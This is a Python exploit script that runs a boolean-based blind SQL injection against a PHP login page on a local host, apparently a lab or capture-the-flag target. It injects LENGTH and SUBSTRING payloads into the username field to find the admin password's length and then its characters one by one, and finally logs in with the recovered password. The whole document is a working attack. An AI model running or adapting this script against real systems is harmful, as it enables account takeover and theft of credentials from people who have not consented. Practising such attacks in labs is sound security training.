import requests
import string
import time

url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}
cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}

print("[*] Boolean-based blind SQLi to extract password characteristics")
print("="*60)

# First, let's determine password length
print("\n[*] Step 1: Determining password length...")

for length in range(1, 21):
    # Payload to check if password length equals this value
    payload = f"admin' AND LENGTH(password)={length}-- "
    data = {
        "username": payload,
        "password": "test",
        "submit": "submit"
    }
    
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        
        # If we get "password" response, the condition is true
        if response.text == '{"response":"password"}':
            print(f"[!] Password length found: {length}")
            password_length = length
            break
            
    except Exception as e:
        print(f"[-] Error: {e}")
else:
    print("[-] Could not determine password length (might be > 20)")
    password_length = None

if password_length:
    print(f"\n[*] Step 2: Extracting password character by character...")
    print(f"[*] Target length: {password_length} characters")
    
    password = ""
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()-_=+[]{}|;:,.<>?/"
    
    for position in range(1, password_length + 1):
        found_char = None
        
        for char in chars:
            # Escape single quote
            char_escaped = char.replace("'", "\\'")
            
            # Check if character at this position matches
            payload = f"admin' AND SUBSTRING(password,{position},1)='{char_escaped}'-- "
            data = {
                "username": payload,
                "password": "test",
                "submit": "submit"
            }
            
            try:
                response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
                
                if response.text == '{"response":"password"}':
                    found_char = char
                    password += char
                    print(f"[+] Position {position}: '{char}' -> Current: {password}")
                    break
                    
            except Exception as e:
                print(f"[-] Error at position {position}, char '{char}': {e}")
                break
        
        if not found_char:
            print(f"[-] Could not find character at position {position}")
            print(f"[*] Partial password extracted: {password}")
            break
    
    if len(password) == password_length:
        print(f"\n[!] FULL PASSWORD EXTRACTED: {password}")
        print(f"[!] Length: {len(password)}")
        
        # Verify by trying to login
        print(f"\n[*] Verifying password by attempting login...")
        data = {
            "username": "admin",
            "password": password,
            "submit": "submit"
        }
        
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"[*] Login response: {response.text}")
        
        if "Success" in response.text or response.text != '{"response":"password"}':
            print("[!] LOGIN SUCCESSFUL!")
            if response.cookies:
                print(f"[!] Cookies: {response.cookies.get_dict()}")
        else:
            print("[-] Login failed - extracted password might be incorrect")

print("\n[*] Script complete")

